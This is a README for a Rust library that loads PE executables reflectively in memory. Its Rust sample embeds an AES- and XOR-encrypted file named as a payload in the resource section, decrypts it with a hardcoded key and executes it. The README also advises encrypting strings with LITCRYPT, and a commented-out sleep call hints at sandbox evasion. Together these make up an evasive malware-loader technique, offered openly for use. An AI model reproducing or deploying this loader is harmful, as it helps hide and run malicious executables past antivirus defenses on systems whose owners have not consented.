# reflective_loader_rs
Library that allows running PE files in memory


LITCRYPT for strings in code, don't forget to set LITCRYPT_ENCRYPT_KEY var. 
[Repo](https://github.com/anvie/litcrypt.rs)

```PowerShell
$env:LITCRYPT_ENCRYPT_KEY="myverysuperdupermegaultrasecretkey"
```
Sample code demonstrating how to use the library is commented within the lib.rs file.

```rust
#[link_section = ".rsrc"]
static DATA: &[u8] = include_bytes!("..\\payload_debug_xor_aes.exe");

// Main function
#[no_mangle]
 pub extern "C" fn main(_argc: isize, _argv: *const *const u8) -> isize {
     // let now = Instant::now();

     // make_sleep(5).expect("sleep failed");
     // println!("{}", now.elapsed().as_secs());

     let key = "16 BYTES KEY"; //String

     // Convert to bytes and create key_array in one step.
     let key_array: [u8; 16] = key
         .as_bytes()
         .try_into()
         .expect("Failed to convert key into a 16 byte array");

     let cipher = Cipher::new_128(&key_array);
     let decrypted_aes = cipher.cbc_decrypt(&key_array, DATA);
     let decrypted_xor = xor_decrypt(&key_array, &decrypted_aes);

     unsafe {
         reflective_loader(decrypted_xor.clone());
     };

    0
}
```

Environment Support
- This library supports a no_std environment.
